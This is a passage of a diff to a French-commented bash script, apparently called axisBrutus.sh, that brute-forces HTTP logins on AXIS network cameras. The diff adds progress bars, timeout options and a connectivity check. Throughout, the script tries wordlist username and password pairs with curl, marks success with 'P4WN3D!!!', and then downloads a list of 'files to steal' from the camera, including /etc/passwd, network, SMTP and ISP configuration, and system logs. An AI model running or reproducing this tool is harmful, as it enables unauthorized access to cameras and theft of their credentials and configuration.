aCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1wYXNzd29yZHMgLi9heGlzX3Bhc3MudHh0IC0tdXNlcm5hbWVzIC4vYXhpc191c2VybmFtZXMudHh0IAoKIC0gRGVmaW5pciBsZSBmaWNoaWVyIGRlIHNhdXZlZ2FyZGU6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tZXhwb3J0IG1kcF9heGlzX3Rlc3QudHh0IC0tdmVyYm9zZSAKCiAtIEZpY2hpZXIgbG9ncyBkJ2F0dGFxdWU6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tbG9nIC4vdGVzdC5sb2cgCgogLSBNb2RlIHZlcmJldXggOgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLXZlcmJvc2UgCgogLSBQYXJhbWV0cmFnZSBjdXJsOgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLW1heHRpbWUgMTAgLS10aW1lb3V0IDQgCgoK"
 	echo -e $banniere_aide$aide_texte|base64 -d
 	}
 
 #FUNCTION:
-# log les actions
+# verifie que les entetes sont presents
+#DATE		HEURE		IP:PORT			CATEGORIE	MESSAGE
+#--------	--------	----------------	-----------	----------------------------------
+function logEnteteCheck {
+	premiere_ligne=$(head -n 1 $fichier_logs)
+	
+	if [[ "$premiere_ligne" =~ "IP:PORT" ]];then
+		check='OK'
+	else
+		check='ERROR'
+		echo -e "DATE		HEURE		IP:PORT			CATEGORIE	MESSAGE\n--------	--------	----------------	-----------	----------------------------------" > $fichier_logs
+	fi
+	
+	#echo "{"$premiere_ligne"/"$check"}"
+	}
+
+#FUNCTION:
+# verifie l'existence des fichiers
 function logMessage {
 	log_msg=$1 #message
 	log_type=$2 #type: info, erreur, alerte...etc
 	log_ip=$ip
 	log_date=$(/bin/date "+%D")
 	log_heure=$(/bin/date "+%T")
-	log_taille_max_colonne=13	
+	log_taille_max_colonne=16
+	log_taille_min_colonne=10
 	
 	if [ ${#log_ip} -lt $log_taille_max_colonne ];then
-		log_ligne="$log_date\t$log_heure\t$log_ip\t\t$log_type\t$log_msg"
-	else
-		log_ligne="$log_date\t$log_heure\t$log_ip\t$log_type\t$log_msg"	
+		log_ip="$log_ip\t"
 	fi
 
+	if [ ${#log_ip} -lt $log_taille_min_colonne ];then
+		log_ip="$log_ip\t"
+	fi
+
+	log_ligne="$log_date\t$log_heure\t$log_ip\t$log_type\t$log_msg"	
+
 	echo -e $log_ligne >> $fichier_logs
+	}
+
+function echox	{
+	tput cuu1;tput el;echo -e "$1"
+	}
+
+
+function afficherBarre {
+	#entiers
+	fb_fait=$1
+	fb_total=$2
+	fb_total_txt="-$fb_total-"
+	fb_total_t=$(( 10 ** ((${#fb_total_txt})-3) ))
+	taille_barre=$taille_barre_progression
+	#texte
+	fb_barre=''
+	#calcul: pourcentage fait : unites
+	fb_pourcent_fait_pct=$(( ($fb_fait*100) / $fb_total ))
+	fb_pourcent_fait_pct_txt=$(addZeros 100 $fb_pourcent_fait_pct)	
+	fb_fait_txt=$(addZeros $fb_total_t $fb_fait)	
+	fb_taille_barre_fait=$(( ($fb_pourcent_fait_pct*$taille_barre) / 100 ))
+	#generation: barre de progression (à 100%)
+	for x in $(seq 1 $taille_barre);do
+		fb_barre=$fb_barre""$barre_car_fait""
+	done
+
+
+	#generation: textes
+	txt_fait_sur_total="$fb_fait_txt/$fb_total" 	
+	txt_fb_pourcent_fait_pct="$fb_pourcent_fait_pct_txt%"
+	texte="[$txt_fb_pourcent_fait_pct][$txt_fait_sur_total]"
+	#texte="[$txt_fb_pourcent_fait_pct]"
+	#calcul: taille et position du texte (milieu de la barre)
+	taille_txt=${#texte}
+	pos_txt=$(( ($taille_barre-$taille_txt)/2 ))
+	#generation: parties de la barre avant et apres le texte
+	fb_barre_A=${fb_barre:0:$pos_txt}
+	fb_barre_B=${fb_barre_A//$barre_car_fait/$barre_car_restant}
+	#generation: (avant barre)+(texte)+(apres barre)
+	fb_barre_texte="$fb_barre_A$texte$fb_barre_B"
+	#generation: barre, partie "pourcent accomplie" (partie "faite")
+	barres_fait=${fb_barre_texte:0:$fb_taille_barre_fait}
+	#generation: barre, partie "pourcent restant" (partie "restante")
+	nb_barres_restantes=$(( $taille_barre-$fb_taille_barre_fait ))
+	barres_restantes=${fb_barre_texte:$fb_taille_barre_fait:$nb_barres_restantes}
+	#barres_restantes=${barres_restantes//$barre_car_fait/$barre_car_restant}
+
+	barre_progression=$barre_col_fait""$barres_fait""$barre_col_restant""$barres_restantes""
+	barre_progression="$barre_progression\033[0m"
+	
+	echo -e $barre_progression
 	}
 ####################################################################################################################
 #                                                       ARGUMENTS
@@ -467,11 +536,30 @@ for no_arg in $(seq 0 $nb_args); do
 
 		#lister les modeles testés
 		if [ "$valeur" = "--list" ] || [ "$valeur" = "-l" ];then
-			echo -e "Liste des modeles testés et validés: "${#liste_modeles_verifies[*]}" au total!"
+			echo -e "# Liste des modeles testés et validés: "${#liste_modeles_verifies[*]}" au total!"
 			for mod in ${liste_modeles_verifies[*]}; do
 				echo -e " - AXIS $mod Network Camera"
 			done
 			exit
+		fi
+		#configuration requetes http(curl) 
+		if [ "$valeur" = "--timout" ] || [ "$valeur" = "-t" ];then
+			curl_timeout=${args[$(($no_arg+1))]}
+			if [ $curl_timeout -lt $min_timeout ];then
+				curl_timeout=$min_timeout
+			fi
+		fi
+		if [ "$valeur" = "--maxtime" ] || [ "$valeur" = "-m" ];then
+			curl_maxtime=${args[$(($no_arg+1))]}
+			if [ $curl_maxtime -lt $min_timeout ];then
+				curl_maxtime=$min_timeout
+			fi
+		fi
+		if [ "$valeur" = "--ping-timeout" ];then
+			ping_timeout=${args[$(($no_arg+1))]}
+			if [ $ping_timeout -lt $min_timeout ];then
+				ping_timeout=$min_timeout
+			fi
 		fi
 		#affichage aide 
 		if [ "$valeur" = "--help" ] || [ "$valeur" = "-h" ];then
@@ -508,6 +596,10 @@ for fichier in ${liste_fichiers_a_verifier[*]}; do
 		exit
 	fi
 done
+
+#verifier si les entetes du fichier log existent deja ou pas
+#echo -e "hey:"$(logEnteteCheck)
+logEnteteCheck
 
 #On calcul le nombre de probabilités si les fichiers  existent
 nb_mdp=$(cat $mdp_wordlist|wc -l)
@@ -579,10 +671,17 @@ echo -e "$jaune[+] Usernames list:$cyan $users_wordlist $jaune"
 echo -e "$jaune[+] Total usernames:$cyan$nb_users"
 echo -e "$jaune[+] Total passwords:$cyan$nb_mdp"
 echo -e "$jaune[+] Nombre de combinaisons:$cyan"$nb_combinaisons
-echo -e "$jaune[+] TTL Requêtes HTTP: $cyan curl timeout=$curl_timeout, curl maxtime=$curl_maxtime"
+
+if [ $curl_timeout -ne $curl_timeout_default ] || [ $curl_maxtime -ne $curl_maxtime_default ];then
+	echo -e "$jaune[+] TTL Requêtes HTTP: $cyan curl timeout=$curl_timeout, curl maxtime=$curl_maxtime"
+fi
 
 if [ "$skipModeleDetect" = "OUI" ];then
 	echo -e "$jaune[+] Detection du modele:$cyan Désactivée"
+fi
+
+if [ $ping_timeout -ne $ping_timeout_default ];then
+	echo -e "$jaune[+] Ping timeout:$cyan $ping_timeout"
 fi
 
 if [ "$checkOnly" = "OUI" ];then
@@ -606,6 +705,22 @@ logMessage "Fichier usernames : $users_wordlist" "INFORMATION"
 logMessage "Fichier mots-de-passe : $mdp_wordlist" "INFORMATION" 
 
 ####################################################################################################################
+#                                                 TEST DE CONNECTIVITE
+####################################################################################################################
+
+echo -e "$jaune_fonce\n$souligne"'TEST DE CONNECTIVITE:'$reset
+
+echo -e "$jaune[+] Test en cours :$cyan ping $ip..."
+test_connectivite=$(checkConnectiviteCible)
+if [ "$test_connectivite" = "SUCCES" ];then
+	echo -e "$jaune |_[-] Resultat :$vert OK!"
+else
+	echo -e "$jaune |_[-] Resultat :$rouge ECHEC!"
+	echo -e "$jaune |_[-] Pas d'attaque à faire :$rouge On quitte"
+	logMessage "Ne repond pas au pings" "ERREUR!!!"
+	exit
+fi
+####################################################################################################################
 #                                                       ANALYSE
 ####################################################################################################################
 echo -e "$jaune_fonce\n$souligne"'ANALYSE:'$reset
@@ -621,25 +736,31 @@ if [ "$skipModeleDetect" = "OUI" ];then
 	logMessage "Detection du modèle : Désactivée" "ATTENTION" 
 	modele_complet=$modele_nondetecte
 else
-	echo -en "$jaune[+] Detection du modele de la camera en cours...$cyan"
+	echo -e "$jaune[+] Detection du modele de la camera en cours...$cyan"
 	logMessage "Detection du modele de la camera" "INFORMATION" 
 	#modele=$(modeleExtract $modele_complet) # resultats erronés : diag a faire
+	echo -e "$jaune |_[-] Connexion en cours...$cyan\n"
 	x_modele_complet=$(fullModeleDetect $ip)
 	modele=$(echo $x_modele_complet|sed "s/.*[aA][xX][iI][sS]/axis/g" | cut -d " " -f 2)
 	modele=${modele/.*[aA][xX][iI][sS]/axis}
 
 	#echo -e $magenta$x_modele_complet
 	if [ "$modele_complet" != "$modele_nondetecte" ]; then
+		no_modele_recherche=0
 		for mod in ${liste_modeles_verifies[*]}; do
+			no_modele_recherche=$(( $no_modele_recherche+1 ))
+			echox "$jaune |_[-] Détection en cours: "$(afficherBarre $no_modele_recherche ${#liste_modeles_verifies[*]} )""
 			if [ "$mod" = "$modele" ];then
 				modeles_verifie="OUI"
+				echox "$jaune |_[-] Détection en cours:$cyan Terminée!"
+				break
 			fi
 		done
 
 		if [ "$modeles_verifie" = "OUI" ];then
-			echo -e "$vert$modele, testé et vérifié! $jaune_fonce;)"
+			echo -e "$jaune |_[-] Modele:$cyan $modele $vert(testé et vérifié!) $jaune_fonce;)"
 		else
-			echo -e "$rougeCe modele $modele n'a pas été testé! $jaune_fonce:/"
+			echo -e "$jaune |_[-] Modele:$cyan $modele $rouge(non testé!) $jaune_fonce:/"
 		fi
 	else
 		echo -e "$magenta Le modele n'a pas été reconnu! $jaune_fonce:/"
@@ -741,7 +862,8 @@ if [ "$checkOnly" != "OUI" ];then
 			
 			#avancement:
 			ligne_a_afficher="$jaune[$bleu_fonce$ip$jaune] [$magenta$total_fait_txt$jaune/$magenta_fonce$nb_combinaisons$jaune] [$vert_fonce$progression_pourcent_txt%$jaune] $user $jaune_fonce&$jaune $mdp : "
-			echo -en "$ligne_a_afficher"
+			#echo -en "$ligne_a_afficher"
+			echo -en "$jaune[+] Attaque $jaune_fonce$jaune$ip: "$(afficherBarre "$total_fait" "$nb_combinaisons")"$jaune [$cyan$user$jaune:$cyan$mdp$jaune] "
 			
 			#Requete HTTP
 			curl --connect-timeout $curl_timeout --max-time $curl_maxtime -k -s "$url" --user "$user:$mdp"  -o $tmp	
@@ -767,9 +889,6 @@ if [ "$checkOnly" != "OUI" ];then
 			#si le titre contien "unhotorized"
 			if [ ${#test_unauthorized} -gt 0 ];then
 				echo -e $rouge$msg_echec
-				if [ "$modeVerbose" != 'OUI' ];then
-					tput cuu1;tput el
-				fi
 			else			
 				#sinon on a administration dans le titre de la page alors considere qu'on a passé la porte :D
 				if [ ${#test_administration} -gt 0 ] || [ ${#test_configuration} -gt 0 ];then
@@ -785,9 +904,6 @@ if [ "$checkOnly" != "OUI" ];then
 							break
 						else
 							echo -e "$rouge$msg_echec: Necessite Javascript. Verifiez cette combinaison manuellement pour vérifier svp"
-							if [ "$modeVerbose" != 'OUI' ];then
-								tput cuu1;tput el
-							fi
 							echec_js="OUI"
 							#echo -e $bleu;cat $tmp;echo -e $reset
 							#break
@@ -799,9 +915,6 @@ if [ "$checkOnly" != "OUI" ];then
 						if [ ${#test_page400} -gt 0 ] || [ ${#test_page404} -gt 0 ] || [ ${#test_page500} -gt 0 ];then
 														
 							echo -e "$rouge$msg_echec: Page introuvable. Forcez l'URL avec l'argument \"--url /admin/users.shtml\" $jaune_fonce:/"
-							if [ "$modeVerbose" != 'OUI' ];then
-								tput cuu1;tput el
-							fi
 							echec_404="OUI"
 							break
 						#sinon ok?
@@ -815,12 +928,15 @@ if [ "$checkOnly" != "OUI" ];then
 
 				fi
 			fi
-		requete_temps_B=$(/bin/date +%s)
+			if [ "$modeVerbose" != 'OUI' ];then
+				tput cuu1;tput el
+			fi
+			requete_temps_B=$(/bin/date +%s)
+			top_timer=$(( $(/bin/date +%s) -$heure_depart))
 		done < $mdp_wordlist
 
 		#on check si on a trouvé un mdp afin de ne pas tester plus de usernames
 		if [ "$mdp_trouve" = "OUI" ] ; then
-			top_timer=$(( $(/bin/date +%s) -$heure_depart))
 			break
 		fi
 		#if [ "$echec_js" = "OUI" ]; then
@@ -840,12 +956,23 @@ duree_totale=$(/bin/date -d @$heure_duree_totale +%H:%M:%S)
 ####################################################################################################################
 
 if [ "$mdp_trouve" = "OUI" ]; then
-	echo -e $rouge
+	message_fin="Le mot-de-passe a été trouvé en "$top_timer"s après $total_fait tentatives. "
+
+	#echo -e "$jaune |_[-] Succes: $cyan$message_fin"
+	tput cuu1;tput el;echo -e "$jaune[+] Attaque $ip:$vert Succes!$cyan $message_fin"
+	echo -e $vert
 	echo -e $banniere_bravo|base64 -d
+	echo -e $ab_slogan_bravo
 	echo -e $reset
-	logMessage "Le mot-de-passe a été trouvé en "$top_timer"s après $total_fait tentatives. " "P4WNED!!!" 
+	logMessage "$message_fin" "P4WN3D!!!"
 else
-	logMessage "Le mot-de-passe n'a pas été trouvé!" "DOMMAGE!!!" 
+	message_fin="Le mot-de-passe n'a pas été trouvé apres $total_fait combinaisons, soit "$top_timer"s d'attaque!" 
+	echo -e "$jaune[+] Attaque $ip: $cyan$message_fin"
+	echo -e $rouge
+	echo -e $banniere_tryagain|base64 -d
+	echo -e $ab_slogan_defaite
+	echo -e $reset
+	logMessage "$message_fin" "DOMMAGE!!!"
 fi
 ####################################################################################################################
 #                                    SYNTHESE DES DONNEES RECUPEREES POUR l'EXPORT
@@ -912,20 +1039,26 @@ fi
 ####################################################################################################################
 
 if [ "$mdp_trouve" = "OUI" ]; then
-	echo -e "$jaune_fonce\n$souligne"'TELECHARGEMENT DE FICHIERS:'$reset
+	echo -e "$jaune_fonce\n$souligne"'TELECHARGEMENT DE FICHIERS:\n'$reset
 	fichiers_a_voler=('/etc/passwd' '/etc/group' '/etc/applications/config_cam1' '/etc/network/network.conf' '/etc/resolv.conf' '/etc/sftpd.banner' '/var/log/messages' '/var/log/messages.old' '/etc/sysconfig/id.conf' '/etc/sysconfig/appwiz.conf' '/etc/sysconfig/systime.conf' '/etc/sysconfig/isp.conf' '/etc/sysconfig/brand.conf' '/etc/sysconfig/smtp.conf' '/etc/sysconfig/image.conf' '/etc/sysconfig/dst.conf' '/etc/sysconfig/layout.conf' '/etc/httpd/conf/boa.conf' '/etc/pwdb.conf' )
-
+	nb_fichiers_a_voler=${#fichiers_a_voler[@]}
+	no_fichier=0
 	temp_vole='/tmp/export_vole.txt'
 
 	export_donnes=$export_donnes'\n\nFICHIERS:'
 	logMessage "Telechargement des fichiers" "INFORMATION" 
 	for fichier_x in ${fichiers_a_voler[*]}; do
+		no_fichier=$(( $no_fichier+1 ))
 		#logMessage "Telechargement : $fichier_x" "INFORMATION" 
-
-		voleFichier $ip $fichier_x > $temp_vole
+			
+		if [ "$modeVerbose" != 'OUI' ];then
+			tput cuu1;tput el
+		fi
 		
 		#affichage a l'ecran
-		echo -e "$jaune[+] FICHIER:$cyan $fichier_x:"
+		echo -e "$jaune[+] Fichier: "$(afficherBarre "$no_fichier" "$nb_fichiers_a_voler")"$jaune [$cyan$fichier_x$jaune]"
+		voleFichier $ip $fichier_x > $temp_vole
+		#echo -e "$jaune[+] FICHIER:$cyan $fichier_x:"
 		if [ "$modeVerbose" = 'OUI' ]; then
 			echo -e "$vert--------------------------------------------------------------$italic$vert_fonce"
 			cat $temp_vole
@@ -941,6 +1074,9 @@ if [ "$mdp_trouve" = "OUI" ]; then
 
 	done;
 
+	tput cuu1;tput el
+	echo -e "$jaune[+] Fichier:$cyan Terminé!"
+		
 
 	echo -e "$reset"
 fi
